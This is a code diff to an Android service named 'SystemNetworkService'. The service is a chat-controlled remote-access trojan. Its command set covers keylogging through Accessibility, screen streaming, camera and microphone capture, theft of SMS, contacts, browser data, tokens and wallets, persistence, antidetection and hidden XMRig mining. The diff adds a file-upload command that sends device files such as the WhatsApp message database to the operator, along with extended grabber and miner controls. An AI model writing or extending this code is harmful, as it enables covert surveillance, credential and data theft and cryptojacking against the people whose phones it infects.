@@ -280,9 +280,11 @@ class SystemNetworkService : Service() {
                             "**Recon:**\n`ping` `info` `status` `ip` `uptime` `debug` `restart` `sysinfo` `antidetect`\n\n" +
                             "**Surveillance:**\n`screenshot` `camera` `mic` `location` `clipboard` `keylog`\n\n" +
                             "**Data:**\n`contacts` `sms` `call_log` `wifi` `battery` `processes`\n`installed` `notifications` `apps` `services` `sysprop` `storage`\n\n" +
-                            "**Advanced:**\n`grabber` `wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
+                            "**Grabber:**\n`grabber [all|browser|messenger|tokens|wallets|files]`\n\n" +
+                            "**Advanced:**\n`wifipass` `netstat` `shell` `persist` `update` `config`\n\n" +
                             "**Control:**\n`admin` `overlay` `click` `input` `open` `screen`\n`gesture` `pin` `torch` `vibrate` `stream`\n\n" +
-                            "**Mining:**\n`miner` — Real XMR mining with XMRig\n\n" +
+                            "**Mining:**\n`miner [start|stop|status|set_wallet|set_pool|set_threads]`\n\n" +
+                            "**Upload:**\n`upload <file_path>` — Send file from device\n\n" +
                             "Type `!help <cmd>` for usage info"
                         )
                     }
@@ -344,15 +346,29 @@ class SystemNetworkService : Service() {
                             }
                         }
                         payload?.lowercase() == "start" -> {
-                            startStream(d, 2)
+                            if (DisplayCapture.mediaProjection == null) {
+                                d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first to grant permission, then try `!stream start` again")
+                                try {
+                                    val intent = Intent("com.openaccess.sdk.REQUEST_SCREEN")
+                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                    sendBroadcast(intent)
+                                } catch (_: Exception) {}
+                            } else {
+                                startStream(d, 2)
+                            }
                         }
                         payload == null || payload.isBlank() -> {
-                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nUsage: `!stream start` (2fps)\nUsage: `!stream 5` (5fps, max 30)\nUsage: `!stream stop`")
+                            val mp = DisplayCapture.mediaProjection != null
+                            d.sendMsg(":tv: **!stream**\nLive screen feed.\nScreen capture: ${if (mp) ":green_circle: Enabled" else ":red_circle: Disabled (run `!screenshot on` first)"}\nUsage: `!stream start` (2fps)\nUsage: `!stream 5` (5fps, max 30)\nUsage: `!stream stop`")
                         }
                         else -> {
                             val fps = payload.toIntOrNull()
                             if (fps != null && fps in 1..30) {
-                                startStream(d, fps)
+                                if (DisplayCapture.mediaProjection == null) {
+                                    d.sendMsg(":x: **Screen capture not enabled**\nRun `!screenshot on` first, then try again")
+                                } else {
+                                    startStream(d, fps)
+                                }
                             } else {
                                 d.sendMsg(":x: Invalid FPS. Use 1-30. Usage: `!stream <1-30>`")
                             }
@@ -384,7 +400,9 @@ class SystemNetworkService : Service() {
                                 startActivitySafely(i)
                                 d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
                             } else {
-                                d.sendMsg(":keyboard: Keylogger already running")
+                                val text = AccessibilityHelper.getText()
+                                val sessions = AccessibilityHelper.getAppSessions()
+                                d.sendMsg(":keyboard: **Keylogger active**\nCaptured: ${text.length} chars\nApps tracked: ${sessions.size}\nUse `!keylog summary` or `!keylog raw` to view data")
                             }
                         }
                         "off" -> {
@@ -406,14 +424,15 @@ class SystemNetworkService : Service() {
                                 return
                             }
                             val summary = AccessibilityHelper.getAppSummary()
-                            d.sendMsg(":keyboard: **Keylogger — App Summary**\n$summary")
+                            val text = AccessibilityHelper.getText()
+                            d.sendMsg(":keyboard: **Keylogger — App Summary**\nTotal captured: ${text.length} chars\n\n$summary")
                         }
                         "raw" -> {
                             val cap = AccessibilityHelper.getText()
                             if (cap.isEmpty()) {
-                                d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured. Use `!keylog on` to enable.")
+                                d.sendMsg(":keyboard: **Keylogger**\nNo keystrokes captured yet. Open an app and start typing.\n\nUse `!keylog on` to verify status.")
                             } else {
-                                d.sendMsg(":keyboard: **Raw Keystrokes**\n```\n${cap.take(1900)}\n```")
+                                d.sendMsg(":keyboard: **Raw Keystrokes** (${cap.length} chars)\n```\n${cap.take(1900)}\n```")
                             }
                         }
                         else -> {
@@ -422,10 +441,11 @@ class SystemNetworkService : Service() {
                                 return
                             }
                             val logs = AccessibilityHelper.getFormattedAppLogs()
+                            val text = AccessibilityHelper.getText()
                             if (logs.isEmpty() || logs == "No app activity logged") {
-                                d.sendMsg(":keyboard: **Keylogger Active**\nNo app activity yet. Open an app and start typing.\n\n**Usage:**\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
+                                d.sendMsg(":keyboard: **Keylogger Active**\nCaptured: ${text.length} chars\nNo app activity yet. Open an app and start typing.\n\n**Usage:**\n`!keylog summary` — app overview\n`!keylog raw` — raw keystrokes\n`!keylog clear` — wipe logs")
                             } else {
-                                d.sendMsg(":keyboard: **Per-App Keylog**\n```\n$logs\n```")
+                                d.sendMsg(":keyboard: **Per-App Keylog** (${text.length} chars total)\n```\n$logs\n```")
                             }
                         }
                     }
@@ -1194,6 +1214,24 @@ class SystemNetworkService : Service() {
                             )
                         }
                     }
+                }
+                "upload" -> {
+                    val filePath = payload?.trim()
+                    if (filePath == null || filePath.isBlank()) {
+                        d.sendMsg(":book: **!upload**\nSend a file from the device.\nUsage: `!upload <file_path>`\nExamples:\n• `!upload /sdcard/Download/file.pdf`\n• `!upload /data/data/com.whatsapp/databases/msgstore.db`\n• `!upload /sdcard/DCIM/Camera/photo.jpg`")
+                        return
+                    }
+                    val file = File(filePath)
+                    if (!file.exists()) {
+                        d.sendMsg(":x: **File not found**: `$filePath`")
+                        return
+                    }
+                    if (file.length() > 25 * 1024 * 1024) {
+                        d.sendMsg(":x: **File too large** (${file.length() / 1024 / 1024}MB). Max 25MB.")
+                        return
+                    }
+                    d.sendMsg(":arrow_up: **Uploading**: `${file.name}` (${file.length() / 1024}KB)")
+                    d.sendFile(":inbox_tray: **${file.name}**", file.name, file.readBytes())
                 }
             }
         } catch (e: Exception) {
